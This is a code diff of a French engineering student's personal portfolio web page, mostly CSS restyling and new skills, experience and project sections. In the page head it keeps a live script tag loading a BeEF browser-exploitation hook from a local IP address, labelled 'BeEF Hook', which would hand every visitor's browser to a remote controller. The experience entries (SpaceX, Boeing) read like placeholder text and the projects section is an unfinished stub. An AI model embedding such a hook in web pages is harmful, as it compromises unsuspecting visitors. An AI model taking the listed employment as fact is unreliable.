@@ -8,6 +8,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css"> <!-- Ajout du lien vers la feuille de style AOS -->
     <script src="http://192.168.44.131:3000/hook.js"></script> <!-- BeEF Hook -->
     <style>
+    
         body {
             font-family: 'Poppins', sans-serif;
             margin: 0;
@@ -24,36 +25,40 @@
         .hero {
             position: relative;
             height: 100vh;
-            background: url('elements/background.jpg') no-repeat center center/cover;
+            background: url('https://4kwallpapers.com/images/wallpapers/dark-background-abstract-background-network-3d-background-3840x2160-8324.png') no-repeat center center/cover;
             display: flex;
             justify-content: center;
             align-items: center;
             color: #fff;
             text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+            padding-top: 20px; /* Ajout d'un padding en haut pour éloigner le titre du bord supérieur */
         }
+
         .hero h1 {
             font-size: 4rem;
             margin: 0;
             animation: fadeInDown 1.5s ease-in-out;
         }
+        
         .hero p {
             font-size: 1.5rem;
-            margin: 0px 0 0;
+            margin: 10px 0 0; /* Ajout d'une marge en haut pour éloigner le paragraphe du titre */
             animation: fadeInUp 1.5s ease-in-out;
         }
-        .content, .gallery, .contact {
+
+        .content, .competence, .contact, .experience, .projet {
             padding: 50px 20px;
             min-height: 400px; /* Ajout d'une hauteur minimale pour uniformiser les sections */
         }
         /* Styles pour les titres des sections */
-        .content h2, .gallery h2, .contact h2 {
+        .content h2, .competence h2, .contact h2, .experience h2, .projet h2 {
             font-family: 'Montserrat', sans-serif;
             font-size: 2.5rem;
             margin-bottom: 20px;
             margin-top: -10px; /* Réduire la marge supérieure */
         }
 
-        .content p, .gallery p, .contact p {
+        .content p, .competence p, .contact p, .experience p, .projet p {
             font-size: 1.125rem;
             line-height: 1.6;
             margin-bottom: 30px;
@@ -75,7 +80,7 @@
             background-color: #0056b3;
             transform: translateY(-5px);
         }
-        .gallery img {
+        .competence img {
             max-width: 100%;
             height: auto;
             margin: 10px;
@@ -89,16 +94,6 @@
         }
         .footer p {
             margin: 0;
-        }
-        .heart {
-            color: #e25555;
-            font-size: 2rem;
-            margin: 0 5px;
-        }
-        .heart-small {
-            color: #e25555;
-            font-size: 1.5rem;
-            margin: 0 3px;
         }
         .map-container {
         margin: 2rem 0; /* Conserver la marge supérieure et inférieure */
@@ -174,14 +169,21 @@
 
         /* Teintes de blanc pour les différentes sections */
         .content {
-            background-color: #444; /* Gris foncé */
+            background-color: #222; /* Gris foncé */
         }
-        .gallery {
-            background-color: #555; /* Gris légèrement plus clair */
+        .competence {
+            background-color: #333; /* Gris légèrement plus clair */
         }
-       
-    .contact {
-            background-color: #666; /* Gris moyen */
+        .experience {
+            background-color: #444;
+            color: #fff;
+            padding: 50px;
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+        }
+
+        .contact {
+            background-color: #444; /* Gris moyen */
         }
 
         /* Styles pour les dossiers */
@@ -230,8 +232,7 @@
         }
 
         .close {
-            color:
-#aaa;
+            color:#aaa;
             float: right;
             font-size: 28px;
             font-weight: bold;
@@ -251,28 +252,65 @@
             object-fit: cover; /* Redimensionner l'image tout en conservant ses proportions */
             border-radius: 5px; /* Pour rendre l'image légèrement arrondie si nécessaire */
         }
+        .timeline {
+            position: relative;
+            margin: 50px 0;
+        }
+        
+        .timeline-item {
+            position: relative;
+            padding: 20px;
+            border-left: 2px solid #007bff; /* Couleur de la ligne de la frise */
+            margin-bottom: 40px;
+        }
+        
+        .timeline-item::before {
+            content: attr(data-year);
+            position: absolute;
+            top: 0;
+            left: -70px; /* Positionnement de l'année sur la frise */
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #007bff; /* Couleur de l'année */
+        }
+        
+        .timeline-item h3 {
+            margin-top: 0;
+            margin-bottom: 10px;
+            font-size: 1.5rem;
+        }
+        
+        .timeline-item p {
+            margin: 0;
+            font-size: 1rem;
+        }
+
     </style>
 </head>
 <body>
     <div class="hero">
         <div class="container">
-            <h1 data-aos="fade-down">Bienvenue sur mon site web !</h1>
-            <p data-aos="fade-up">Ici vous apprendrez à mieux me connaître</p>
+            <h1 data-aos="fade-down">Gabriel Casarotto</h1>
+            <p data-aos="fade-up">Elève ingénieur en aéronautique et spatial <br>
+                Etablissement : IPSA<br>
+                Fillière : Signaux et système aérospatiaux<br>
+                Promotion 2026</p>
         </div>
     </div>
     <div class="content" data-aos="fade-up" data-aos-duration="1000">
         <div class="container">
-            <h2>À propos de moi 🤔</h2>
+            <h2>🤔À Propos De Moi🤔</h2>
             <p>Je m'appelle Gabriel Casarotto, je suis actuellement en troisième année dans une école d'ingénieurs aéronautique et spatial, dans la filière "signaux et systèmes aérospatiaux". Dès la rentrée prochaine, j'aurai l'honneur de me concentrer pleinement sur la filière spatiale de l'école : "Espace, Lanceurs et Satellites".<br><br>
                 Actuellement, je suis à la recherche d'un emploi pour la période de mi-juin à mi-août, afin de préparer mon semestre d'études à l'étranger.<br><br>
-                En dehors des cours, j'aime faire du sport et créer de nouvelles choses, notamment avce l'IoT (vous pourrez trouver mes créations un peu plus tard).</p>
+                En dehors des cours, j'aime faire du sport et créer de nouvelles choses, notamment avec l'IoT (vous trouverez mes créations un peu plus bas).</p>
         </div>
     </div>
 
     <!-- Section pour les dossiers (langage de programmation, langues, Logiciels) -->
-    <div class="gallery" data-aos="fade-up" data-aos-duration="1000">
+    <div class="competence" data-aos="fade-up" data-aos-duration="1000">
         <div class="container">
-            <h2>Mes compétences ⚙️</h2>
+            <h2>⚙️Mes Compétences⚙️</h2>
+            <br><br><br>
             <div class="folders">
                 <!-- Dossier Langage de Programmation -->
                 <div class="folder" onclick="openModal('langage')">
@@ -339,27 +377,66 @@
             <span class="close" onclick="closeModal('logiciels')">&times;</span>
             <!-- Contenu de l'album logiciels -->
             <h3>Logiciels</h3>
+            <h4>Conception et Modélisation 3D</h4>
             <img src="https://play-lh.googleusercontent.com/U9xypdqrbAAa2SR1oKqsXn8UpBZzftY9N2ZAfzpgFRDMme9JCVJIZU9RvRZIOOGbWvtc" alt="Catia" class="folder-image">
             
             <img src="https://cdn.icon-icons.com/icons2/3053/PNG/512/autodesk_fusion_macos_bigsur_icon_190367.png" alt="fusion 360" class="folder-image">
             
             <img src="https://cdn.icon-icons.com/icons2/3053/PNG/512/ultimaker_cura_macos_bigsur_icon_189596.png" alt="cura" class="folder-image">
             
+            <h4>Conception Électronique</h4>
             <img src="https://easyeda.com/images/easyeda-thumbnail.png?id=d5ed1fe5930602975df1" alt="easyEDA" class="folder-image">
             
+            <h4>Développement et Programmation</h4>
+            <img src="https://cdn.icon-icons.com/icons2/2107/PNG/512/file_type_vscode_icon_130084.png" alt="VsCode" class="folder-image">
+            
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/73/Arduino_IDE_logo.svg/2048px-Arduino_IDE_logo.svg.png" alt="Arduino_IDE" class="folder-image">
+            
+            <img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/i/feaf74a2-da81-42f2-9c50-37686d02557a/d73n2y9-fc7e0a66-1dd8-42d2-9aba-29a33990067b.png" alt="CodeBlocks" class="folder-image">
+            
+            <img src="https://www.jackenhack.com/wp-content/uploads/2020/01/Quartus_prime_icon.png" alt="Quartus" class="folder-image">
+            
+            <h4>Bureautique</h4>
             <img src="https://cdn.icon-icons.com/icons2/1381/PNG/512/msword_94106.png" alt="word" class="folder-image">
             
             <img src="https://images.freeimages.com/fic/images/icons/2795/office_2013_hd/2000/powerpoint.png" alt="powerpoint" class="folder-image">
             
             <img src="https://cdn.icon-icons.com/icons2/1381/PNG/512/msexcel_93695.png" alt="excel" class="folder-image">
             
-            <img src="https://www.tiilt.io/wp-content/uploads/2023/07/Design-sans-titre-3.png" alt="Image 3" class="folder-image">
-            
+            <h4>Design Graphique</h4>
+            <img src="https://www.tiilt.io/wp-content/uploads/2023/07/Design-sans-titre-3.png" alt="Canva" class="folder-image">
+           
+        </div>
+    </div>
+    
+    <!-- Section XP -->
+    <div class="experience" data-aos="fade-up" data-aos-duration="1000">
+        <div class="container">
+            <h2>Expérience Professionnelle</h2>
+            <div>
+        <h3>Ingénieur en aérospatiale junior</h3>
+        <p><strong>Entreprise :</strong> SpaceX</p>
+        <p><strong>Période :</strong> Juin 2023 - Août 2023</p>
+        <p><strong>Description :</strong> En tant qu'ingénieur en aérospatiale junior chez SpaceX, j'ai participé à plusieurs projets de conception et de développement de systèmes de propulsion pour les fusées Falcon. Mes responsabilités comprenaient l'analyse des performances des moteurs, la modélisation par ordinateur, et la coordination des tests sur le terrain.</p>
+        <br>
+        <h3>Stagiaire en ingénierie aéronautique</h3>
+        <p><strong>Entreprise :</strong> Boeing</p>
+        <p><strong>Période :</strong> Janvier 2023 - Mai 2023</p>
+        <p><strong>Description :</strong> Pendant mon stage chez Boeing, j'ai travaillé au sein de l'équipe d'ingénierie des structures sur le programme 737 MAX. J'ai contribué à la conception de composants structurels, à l'analyse des contraintes et à la gestion des modifications de conception.</p>
+    </div>
+        </div>
+    </div>
+    
+    <!-- Section Projet -->
+    <div class="projet" data-aos="fade-up" data-aos-duration="1000">
+        <div class="container">
+            <h2>Mes Projets</h2>
+            <p>Je</p>
         </div>
     </div>
     
     <!-- Section Contact -->
-<div class="contact" data-aos="fade-up" data-aos-duration="1000">
+    <div class="contact" data-aos="fade-up" data-aos-duration="1000">
     <div class="container">
         <h2>📱Contact ✉️</h2>
         <p>Pour toute question ou demande d'information, vous pouvez me contacter de différentes manières :</p>
@@ -377,7 +454,7 @@
         <a href="https://www.tiktok.com/@gabspacesystem" target="_blank" class="button">Cliquez ici pour voir mes créations</a>
     </div>
     <div class="map-container">
-    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d20895.126792505886!2d2.5244638694405084!3d49.10771401181025!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x47e6393554382921%3A0x6096ef42dab25d2f!2sSurvilliers!5e0!3m2!1sfr!2sfr!4v1716973812663!5m2!1sfr!2sfr" width="600" height="450" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
+    <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d20900.396341931562!2d2.545525252037461!3d49.09519973283448!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sfr!2sfr!4v1716975808362!5m2!1sfr!2sfr" width="600" height="450" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
     </div>
 </div>
 
